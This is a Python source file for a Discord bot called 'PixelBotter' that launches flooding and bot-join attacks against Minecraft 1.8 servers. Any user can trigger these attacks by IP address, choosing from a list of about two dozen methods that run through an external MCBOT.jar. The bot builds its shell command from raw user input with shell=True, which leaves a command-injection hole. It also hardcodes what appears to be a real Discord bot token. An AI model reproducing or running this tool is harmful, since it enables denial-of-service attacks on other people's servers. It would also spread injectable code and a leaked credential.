import discord
from discord.ext import commands
import subprocess

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents)

# Global variable to store ongoing attacks
ongoing_attacks = {}

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    await bot.change_presence(activity=discord.Game(name="with commands"))

@bot.event
async def on_message(message):
    # Check if the message is from the bot itself
    if message.author == bot.user:
        return

    # Process commands from messages
    await bot.process_commands(message)

@bot.command(name='support')
async def support_command(ctx):
    """Display support information and available commands."""
    support_embed = discord.Embed(
        title='PixelBotter Commands',
        description='**PixelBotter, A 1.8x Minecraft Bot Attack Discord Bot**:',
        color=discord.Color.blue()
    )
    support_embed.add_field(
        name='`$support`',
        value='Show this support message. Get a list of all available commands.',
        inline=False
    )
    support_embed.add_field(
        name='`$methods`',
        value='Display a list of available attack methods.',
        inline=False
    )
    support_embed.add_field(
        name='`$attack <ip> <method> [duration]`',
        value='Launch a bot attack with the specified IP, method, and optional duration (default: 30 seconds).',
        inline=False
    )
    await ctx.send(embed=support_embed)

@bot.command(name='methods')
async def methods_command(ctx):
    """Display a list of available attack methods."""
    # Removed "gayspam" from the list of attack methods
    attack_methods = [
        "bigpacket", "botjoiner", "doublejoin", "emptypacket", "handshake",
        "invaliddata", "invalidspoof", "invalidnames", "spoof", "join", "legacyping",
        "legitnamejoin", "localhost", "pingjoin", "longhost", "longnames", "nullping",
        "ping", "query", "randompacket", "bighandshake", "unexpectedpacket", "memory", "test"
    ]

    methods_list = '\n'.join(attack_methods)
    await ctx.send(f'Available attack methods:\n```{methods_list}```')

@bot.command(name='attack')
async def attack_command(ctx, ip: str, method: str, duration: int = 30):
    """Launch a bot attack with the specified IP, method, and optional duration."""
    if not ip or not method:
        await ctx.send('Please provide both an IP address and a method.')
        return

    valid_methods = [
        "bigpacket", "botjoiner", "doublejoin", "emptypacket", "handshake",
        "invaliddata", "invalidspoof", "invalidnames", "spoof", "join", "legacyping",
        "legitnamejoin", "localhost", "pingjoin", "longhost", "longnames", "nullping",
        "ping", "query", "randompacket", "bighandshake", "unexpectedpacket", "memory", "test"
    ]

    if method.lower() not in valid_methods:
        await ctx.send(f'Invalid attack method. Use $methods to see the list of available methods.')
        return

    # Use f-string for better readability
    command_to_run = f'java -jar MCBOT.jar {ip} 47 {method} {duration} -1'
    await ctx.send(f'Launching {method} attack on {ip} for {duration} seconds...')

    try:
        result = subprocess.run(command_to_run, shell=True, capture_output=True, text=True, timeout=180)

        if result.returncode == 0:
            await ctx.send('Attack launched successfully!')
        else:
            await ctx.send(f'Error: {result.stderr}')

    except subprocess.TimeoutExpired:
        await ctx.send('Error: Attack timed out.')

# Run the bot with your actual bot token
bot.run('MTE5MDY2MTAwMjgwMzU2NDYwNQ.GS8hHA._82jvPzJlz-_t9SLcqkFBQ4NuZunDWo_BCDLiY')
